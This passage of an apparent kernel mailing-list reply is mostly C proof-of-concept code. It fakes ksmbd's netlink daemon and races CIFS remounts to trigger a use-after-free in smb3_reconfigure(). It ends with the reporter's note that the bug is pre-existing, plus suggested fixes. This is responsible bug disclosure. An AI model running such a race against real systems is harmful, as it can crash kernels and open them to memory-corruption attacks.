+     struct sockaddr_nl sa;
+     char buf[8192];
+
+     fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
+     if (fd < 0) { perror("sock"); return -1; }
+     memset(&sa, 0, sizeof(sa));
+     sa.nl_family = AF_NETLINK;
+     sa.nl_pid = getpid();
+     if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) { 
+perror("bind"); close(fd); return -1; }
+
+     /* CTRL_CMD_GETFAMILY for SMBD_GENL */
+     memset(buf, 0, sizeof(buf));
+     struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
+     struct genlmsghdr *genlh = (struct genlmsghdr *)(buf + NLMSG_HDRLEN);
+     nlh->nlmsg_len = NLMSG_LENGTH(GENL_HDRLEN);
+     nlh->nlmsg_type = GENL_ID_CTRL;
+     nlh->nlmsg_flags = NLM_F_REQUEST;
+     nlh->nlmsg_seq = 1; nlh->nlmsg_pid = getpid();
+     genlh->cmd = CTRL_CMD_GETFAMILY; genlh->version = 2;
+     struct nlattr *a = (struct nlattr *)(buf + NLMSG_HDRLEN + GENL_HDRLEN);
+     a->nla_type = CTRL_ATTR_FAMILY_NAME;
+     a->nla_len = NLA_HDRLEN + strlen(KSMBD_GENL_NAME) + 1;
+     memcpy((char *)a + NLA_HDRLEN, KSMBD_GENL_NAME, 
+strlen(KSMBD_GENL_NAME) + 1);
+     nlh->nlmsg_len = NLMSG_LENGTH(GENL_HDRLEN) + a->nla_len;
+
+     struct sockaddr_nl dst;
+     memset(&dst, 0, sizeof(dst)); dst.nl_family = AF_NETLINK; 
+dst.nl_pid = 0;
+     struct iovec iov[1]; iov[0].iov_base = buf; iov[0].iov_len = 
+nlh->nlmsg_len;
+     struct msghdr msg; memset(&msg, 0, sizeof(msg));
+     msg.msg_name = &dst; msg.msg_namelen = sizeof(dst); msg.msg_iov = 
+iov; msg.msg_iovlen = 1;
+     ret = sendmsg(fd, &msg, 0);
+     if (ret < 0) { perror("send1"); close(fd); return -1; }
+     ret = recv(fd, buf, sizeof(buf), 0);
+     if (ret < 0) { perror("recv1"); close(fd); return -1; }
+     if (nlh->nlmsg_type == NLMSG_ERROR) {
+         struct nlmsgerr *e = NLMSG_DATA(nlh);
+         fprintf(stderr, "err %d\n", e->error); close(fd); return -1;
+     }
+     int remaining = nlh->nlmsg_len - NLMSG_HDRLEN - GENL_HDRLEN;
+     struct nlattr *ra = (struct nlattr *)((char *)nlh + NLMSG_HDRLEN + 
+GENL_HDRLEN);
+     while (MY_NLA_OK(ra, remaining)) {
+         if (ra->nla_type == CTRL_ATTR_FAMILY_ID) {
+             family_id = *(int *)((char *)ra + NLA_HDRLEN);
+             break;
+         }
+         ra = MY_NLA_NEXT(ra, remaining);
+     }
+     if (family_id < 0) { fprintf(stderr, "no SMBD_GENL\n"); close(fd); 
+return -1; }
+
+     /* KSMBD_EVENT_STARTING_UP */
+     char rq[sizeof(struct startup_req)];
+     struct startup_req *sr = (struct startup_req *)rq;
+     memset(rq, 0, sizeof(rq));
+     sr->tcp_port = htons(445); sr->file_max = 100;
+     sr->smb2_max_write = 65536; sr->smb2_max_read = 65536; 
+sr->smb2_max_trans = 65536;
+     sr->max_connections = 10;
+     strcpy((char *)sr->min_prot, "2.1"); strcpy((char *)sr->max_prot, 
+"3.1.1");
+     strcpy((char *)sr->netbios_name, "POC");
+     strcpy((char *)sr->work_group, "WORKGROUP");
+     strcpy((char *)sr->server_string, "PoC");
+
+     memset(buf, 0, sizeof(buf));
+     nlh = (struct nlmsghdr *)buf;
+     genlh = (struct genlmsghdr *)(buf + NLMSG_HDRLEN);
+     nlh->nlmsg_type = family_id;
+     nlh->nlmsg_flags = NLM_F_REQUEST;
+     nlh->nlmsg_seq = 2; nlh->nlmsg_pid = getpid();
+     genlh->cmd = KSMBD_EVENT_STARTING_UP; genlh->version = 
+KSMBD_GENL_VERSION;
+     struct nlattr *at = (struct nlattr *)(buf + NLMSG_HDRLEN + 
+GENL_HDRLEN);
+     at->nla_type = KSMBD_EVENT_STARTING_UP;
+     at->nla_len = NLA_HDRLEN + sizeof(rq);
+     memcpy((char *)at + NLA_HDRLEN, rq, sizeof(rq));
+     nlh->nlmsg_len = NLMSG_LENGTH(GENL_HDRLEN) + at->nla_len;
+     memset(&dst, 0, sizeof(dst)); dst.nl_family = AF_NETLINK; 
+dst.nl_pid = 0;
+     iov[0].iov_base = buf; iov[0].iov_len = nlh->nlmsg_len;
+     memset(&msg, 0, sizeof(msg));
+     msg.msg_name = &dst; msg.msg_namelen = sizeof(dst); msg.msg_iov = 
+iov; msg.msg_iovlen = 1;
+     ret = sendmsg(fd, &msg, 0);
+     if (ret < 0) { perror("startup"); close(fd); return -1; }
+
+     /* Event loop: handle LOGIN, SHARE_CONFIG, TREE_CONNECT requests */
+     while (!stop_flag) {
+         memset(buf, 0, sizeof(buf));
+         ret = recv(fd, buf, sizeof(buf), 0);
+         if (ret < 0) { if (errno == EINTR) continue; break; }
+         if (((struct nlmsghdr *)buf)->nlmsg_type != family_id) continue;
+         genlh = (struct genlmsghdr *)((char *)buf + NLMSG_HDRLEN);
+
+         if (genlh->cmd == KSMBD_EVENT_LOGIN_REQUEST) {
+             struct nlattr *attr = (struct nlattr *)((char *)buf + 
+NLMSG_HDRLEN + GENL_HDRLEN);
+             remaining = ((struct nlmsghdr *)buf)->nlmsg_len - 
+NLMSG_HDRLEN - GENL_HDRLEN;
+             while (MY_NLA_OK(attr, remaining)) {
+                 if (attr->nla_type == KSMBD_EVENT_LOGIN_REQUEST) {
+                     struct login_req *r = (struct login_req *)((char 
+*)attr + NLA_HDRLEN);
+                     struct login_rsp resp; memset(&resp, 0, sizeof(resp));
+                     resp.handle = r->handle; resp.uid = 0; resp.gid = 
+0; resp.status = 17;
+                     strncpy((char *)resp.account, (const char 
+*)r->account, 48);
+                     memset(buf, 0, sizeof(buf));
+                     struct nlmsghdr *on = (struct nlmsghdr *)buf;
+                     struct genlmsghdr *og = (struct genlmsghdr *)(buf + 
+NLMSG_HDRLEN);
+                     on->nlmsg_type = family_id; on->nlmsg_flags = 
+NLM_F_REQUEST; on->nlmsg_pid = getpid();
+                     og->cmd = KSMBD_EVENT_LOGIN_RESPONSE; og->version = 
+KSMBD_GENL_VERSION;
+                     struct nlattr *oa = (struct nlattr *)(buf + 
+NLMSG_HDRLEN + GENL_HDRLEN);
+                     oa->nla_type = KSMBD_EVENT_LOGIN_RESPONSE;
+                     oa->nla_len = NLA_HDRLEN + sizeof(resp);
+                     memcpy((char *)oa + NLA_HDRLEN, &resp, sizeof(resp));
+                     on->nlmsg_len = NLMSG_LENGTH(GENL_HDRLEN) + 
+oa->nla_len;
+                     memset(&dst,0,sizeof(dst)); 
+dst.nl_family=AF_NETLINK; dst.nl_pid=0;
+                     iov[0].iov_base=buf; iov[0].iov_len=on->nlmsg_len;
+                     memset(&msg,0,sizeof(msg)); msg.msg_name=&dst; 
+msg.msg_namelen=sizeof(dst); msg.msg_iov=iov; msg.msg_iovlen=1;
+                     sendmsg(fd,&msg,0);
+                     break;
+                 }
+                 attr = MY_NLA_NEXT(attr, remaining);
+             }
+         } else if (genlh->cmd == KSMBD_EVENT_SHARE_CONFIG_REQUEST) {
+             struct nlattr *attr = (struct nlattr *)((char *)buf + 
+NLMSG_HDRLEN + GENL_HDRLEN);
+             remaining = ((struct nlmsghdr *)buf)->nlmsg_len - 
+NLMSG_HDRLEN - GENL_HDRLEN;
+             while (MY_NLA_OK(attr, remaining)) {
+                 if (attr->nla_type == KSMBD_EVENT_SHARE_CONFIG_REQUEST) {
+                     struct share_req *r = (struct share_req *)((char 
+*)attr + NLA_HDRLEN);
+                     char *path = SHARE_DIR;
+                     int plen = strlen(path) + 1;
+                     int total = sizeof(struct share_rsp) + plen;
+                     char *resp_buf = malloc(total);
+                     struct share_rsp *resp = (struct share_rsp *)resp_buf;
+                     memset(resp, 0, total);
+                     resp->handle = r->handle; resp->flags = 31;
+                     resp->create_mask = 0744; resp->dir_mask = 0755;
+                     resp->payload_sz = plen;
+                     strncpy((char *)resp->share_name, (const char 
+*)r->share_name, 64);
+                     memcpy(resp->payload, path, plen);
+                     memset(buf, 0, sizeof(buf));
+                     struct nlmsghdr *on = (struct nlmsghdr *)buf;
+                     struct genlmsghdr *og = (struct genlmsghdr *)(buf + 
+NLMSG_HDRLEN);
+                     on->nlmsg_type = family_id; on->nlmsg_flags = 
+NLM_F_REQUEST; on->nlmsg_pid = getpid();
+                     og->cmd = KSMBD_EVENT_SHARE_CONFIG_RESPONSE; 
+og->version = KSMBD_GENL_VERSION;
+                     struct nlattr *oa = (struct nlattr *)(buf + 
+NLMSG_HDRLEN + GENL_HDRLEN);
+                     oa->nla_type = KSMBD_EVENT_SHARE_CONFIG_RESPONSE;
+                     oa->nla_len = NLA_HDRLEN + total;
+                     memcpy((char *)oa + NLA_HDRLEN, resp, total);
+                     on->nlmsg_len = NLMSG_LENGTH(GENL_HDRLEN) + 
+oa->nla_len;
+                     memset(&dst,0,sizeof(dst)); 
+dst.nl_family=AF_NETLINK; dst.nl_pid=0;
+                     iov[0].iov_base=buf; iov[0].iov_len=on->nlmsg_len;
+                     memset(&msg,0,sizeof(msg)); msg.msg_name=&dst; 
+msg.msg_namelen=sizeof(dst); msg.msg_iov=iov; msg.msg_iovlen=1;
+                     sendmsg(fd,&msg,0);
+                     free(resp_buf);
+                     break;
+                 }
+                 attr = MY_NLA_NEXT(attr, remaining);
+             }
+         } else if (genlh->cmd == KSMBD_EVENT_TREE_CONNECT_REQUEST) {
+             struct nlattr *attr = (struct nlattr *)((char *)buf + 
+NLMSG_HDRLEN + GENL_HDRLEN);
+             remaining = ((struct nlmsghdr *)buf)->nlmsg_len - 
+NLMSG_HDRLEN - GENL_HDRLEN;
+             while (MY_NLA_OK(attr, remaining)) {
+                 if (attr->nla_type == KSMBD_EVENT_TREE_CONNECT_REQUEST) {
+                     struct tree_req *r = (struct tree_req *)((char 
+*)attr + NLA_HDRLEN);
+                     struct tree_rsp resp; memset(&resp,0,sizeof(resp));
+                     resp.handle = r->handle; resp.status = 0;
+                     memset(buf, 0, sizeof(buf));
+                     struct nlmsghdr *on = (struct nlmsghdr *)buf;
+                     struct genlmsghdr *og = (struct genlmsghdr *)(buf + 
+NLMSG_HDRLEN);
+                     on->nlmsg_type = family_id; on->nlmsg_flags = 
+NLM_F_REQUEST; on->nlmsg_pid = getpid();
+                     og->cmd = KSMBD_EVENT_TREE_CONNECT_RESPONSE; 
+og->version = KSMBD_GENL_VERSION;
+                     struct nlattr *oa = (struct nlattr *)(buf + 
+NLMSG_HDRLEN + GENL_HDRLEN);
+                     oa->nla_type = KSMBD_EVENT_TREE_CONNECT_RESPONSE;
+                     oa->nla_len = NLA_HDRLEN + sizeof(resp);
+                     memcpy((char *)oa + NLA_HDRLEN, &resp, sizeof(resp));
+                     on->nlmsg_len = NLMSG_LENGTH(GENL_HDRLEN) + 
+oa->nla_len;
+                     memset(&dst,0,sizeof(dst)); 
+dst.nl_family=AF_NETLINK; dst.nl_pid=0;
+                     iov[0].iov_base=buf; iov[0].iov_len=on->nlmsg_len;
+                     memset(&msg,0,sizeof(msg)); msg.msg_name=&dst; 
+msg.msg_namelen=sizeof(dst); msg.msg_iov=iov; msg.msg_iovlen=1;
+                     sendmsg(fd,&msg,0);
+                     break;
+                 }
+                 attr = MY_NLA_NEXT(attr, remaining);
+             }
+         }
+     }
+     close(fd);
+     return 0;
+}
+
+static void *reader_thread(void *arg)
+{
+     (void)arg;
+     char buf[8192];
+     while (!stop_flag && !crash_detected) {
+         int fd = open("/proc/mounts", O_RDONLY);
+         if (fd >= 0) { while (read(fd, buf, sizeof(buf)) > 0); close(fd); }
+         fd = open("/proc/self/mountinfo", O_RDONLY);
+         if (fd >= 0) { while (read(fd, buf, sizeof(buf)) > 0); close(fd); }
+         usleep(5);
+     }
+     return NULL;
+}
+
+int main(void)
+{
+     pthread_t reader1, reader2, reader3;
+     int i;
+
+     printf("PoC: smb3_reconfigure UAF race\n");
+
+     run_cmd("umount -f " MOUNT_POINT " 2>/dev/null");
+     run_cmd("rm -rf " SHARE_DIR " " MOUNT_POINT " 2>/dev/null");
+     mkdir(SHARE_DIR, 0755);
+     mkdir(MOUNT_POINT, 0755);
+     { int fd = open(SHARE_DIR "/hello.txt", O_CREAT|O_WRONLY, 0644);
+       if(fd>=0){write(fd,"world",5);close(fd);} }
+
+     printf("Starting ksmbd IPC daemon...\n");
+     pid_t daemon_pid = fork();
+     if (daemon_pid == 0) { daemon_ksmbd_ipc(); _exit(0); }
+     sleep(2);
+
+     printf("Mounting CIFS...\n");
+     int mount_ok = 0;
+     for (i = 0; i < 15 && !mount_ok; i++) {
+         if (mount("//127.0.0.1/poc", MOUNT_POINT, "cifs", 0,
+"guest,vers=3.0,iocharset=utf8,noperm,nosharesock,nohandlecache") == 0)
+             mount_ok = 1;
+         else if (run_cmd("mount -t cifs //127.0.0.1/poc /tmp/cifs_mount "
+                          "-o guest,vers=3.0,iocharset=utf8,noperm,"
+                          "nosharesock,nohandlecache 2>/dev/null") == 0)
+             mount_ok = 1;
+         else sleep(1);
+     }
+     if (mount_ok) printf("Mounted OK at %s\n", MOUNT_POINT);
+     else printf("Failed to mount. Trying anyway...\n");
+
+     run_cmd("dmesg -c >/dev/null 2>&1");
+
+     printf("Starting race...\n");
+     pthread_create(&reader1, NULL, reader_thread, NULL);
+     pthread_create(&reader2, NULL, reader_thread, NULL);
+     pthread_create(&reader3, NULL, reader_thread, NULL);
+
+     for (i = 0; i < 2000 && !crash_detected; i++) {
+         char buf[8192];
+         int fd = open("/proc/mounts", O_RDONLY);
+         if (fd >= 0) { while (read(fd, buf, sizeof(buf)) > 0); close(fd); }
+
+         if (mount_ok) {
+             mount("//127.0.0.1/poc", MOUNT_POINT, "cifs", MS_REMOUNT,
+                   "iocharset=utf8,uid=0");
+             mount("//127.0.0.1/poc", MOUNT_POINT, "cifs", MS_REMOUNT,
+                   "vers=1.0");
+             mount("//127.0.0.1/poc", MOUNT_POINT, "cifs", MS_REMOUNT,
+                   "username=t,password=p,domain=d");
+         }
+         if (i % 10 == 0) usleep(50);
+     }
+
+     stop_flag = 1;
+     pthread_join(reader1, NULL); pthread_join(reader2, NULL); 
+pthread_join(reader3, NULL);
+     kill(daemon_pid, SIGTERM); waitpid(daemon_pid, NULL, WNOHANG);
+
+     printf("\n=== dmesg ===\n");
+     FILE *dm = popen("dmesg | tail -60", "r");
+     if (dm) {
+         char line[256];
+         while (fgets(line, sizeof(line), dm)) {
+             printf("%s", line);
+             if (strstr(line,"KASAN")||strstr(line,"use-after-free")||
+                 strstr(line,"BUG:")||strstr(line,"NULL pointer")||
+                 strstr(line,"general protection")||strstr(line,"UAF")||
+                 strstr(line,"smb3")||strstr(line,"cifs"))
+                 crash_detected = 1;
+         }
+         pclose(dm);
+     }
+     if (mount_ok) umount2(MOUNT_POINT, MNT_FORCE|MNT_DETACH);
+     run_cmd("rm -rf /tmp/smb_share /tmp/cifs_mount 2>/dev/null");
+
+     if (crash_detected) { printf("\n*** BUG CONFIRMED! ***\n"); return 1; }
+     printf("\nDone.\n");
+     return 0;
+}
+---8<---
+
+Note that this is a pre-existing issue, not introduced by your patch.
+The same race exists on the success path and the error rollback path
+of smb3_reconfigure() regardless of the goto restructuring.
+
+A possible fix would be to replace the entire cifs_sb->ctx pointer
+atomically rather than mutating the active context in place, or to
+hold an appropriate lock around the context swap.  The Sashiko
+review[1] also mentions a similar race with symlinkroot in
+smb2_parse_native_symlink().
+
+Hope this is helpful.
+
+
+Best,
+
+Xiao
+
+
+[1] 
+https://sashiko.dev/#/patchset/328ba830-24f6-4358-b88f-9aec843ecf14%40web.de
 
